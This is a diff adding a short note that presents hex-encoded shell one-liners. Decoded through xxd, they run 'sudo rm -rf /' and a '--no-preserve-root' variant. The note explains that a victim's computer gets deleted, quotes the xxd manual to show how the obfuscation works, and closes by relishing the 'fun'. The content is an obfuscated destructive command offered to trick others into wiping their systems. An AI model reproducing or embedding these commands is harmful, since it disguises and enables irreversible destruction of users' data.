@@ -1,0 +1,28 @@
+$(echo 7375646f20726d202d72662f | xxd -ps -r)
+
+Basically, this very powerful line includes a " sudo rm -rf/ "
+This means that, the user experiencing this, will got his computer deleted.
+
+There is another version available, but this one only works on linux .
+sudo rm -rf --no-preserve-root
+
+which is in HEX:
+7375646f20726d202d7266202d2d6e6f2d70726573657276652d726f6f74
+
+So...
+$(echo 7375646f20726d202d7266202d2d6e6f2d70726573657276652d726f6f74 | xxd -ps -r)
+
+ -p | -ps | -postscript | -plain
+              output  in  postscript  continuous  hexdump style. Also known as
+              plain hexdump style.
+
+-r | -revert
+          reverse operation: convert (or patch) hexdump into  binary.   If
+          not  writing  to stdout, xxd writes into its output file without
+          truncating it. Use the combination -r -p to read plain hexadeci-
+          mal dumps without line number information and without a particu-
+          lar column layout. Additional  Whitespace  and  line-breaks  are
+          allowed anywhere.
+          
+          
+NOW, IMAGINE THE FUN WE WOULD HAVE ... =)
